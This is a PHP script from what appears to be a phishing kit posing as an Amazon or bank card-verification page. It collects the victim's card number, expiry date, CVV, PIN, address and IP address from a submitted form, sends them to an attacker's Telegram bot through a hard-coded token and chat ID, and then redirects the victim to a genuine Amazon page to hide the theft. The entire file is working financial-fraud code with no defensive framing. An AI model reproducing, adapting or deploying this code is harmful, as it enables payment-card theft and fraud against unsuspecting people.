<?php
$ip = getenv("REMOTE_ADDR");
$message = " ————————— RBC ROYAL ———— ";
$message = "LOG - location = : $ip ";
$message = "———————— AMAZON Card $5M ———— location $ip";
$message .= "Card ## : ".$_POST['1']."\n";
$message .= "Exp Date : ".$_POST['2']."\n";
$message .= "CVV : ".$_POST['3']."\n";
$message .= "Full Address : ".$_POST['4']."\n";
$message .= "Card Pin : ".$_POST['5']."\n";
$message .= ".---------- DOOZ 777 WAS HERE -------------.";
$apiToken = "6367658316:AAGCLcSi0wH86XPd6jWnW6gXm-UjSmtktrw";
$usaabank = [
	    'chat_id' => '6239366940',
	    'text' => $message
	];
    $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($usaabank) );

header("Location: https://www.amazon.com/gp/bestsellers/?ref_=nav_cs_bestsellers");
?>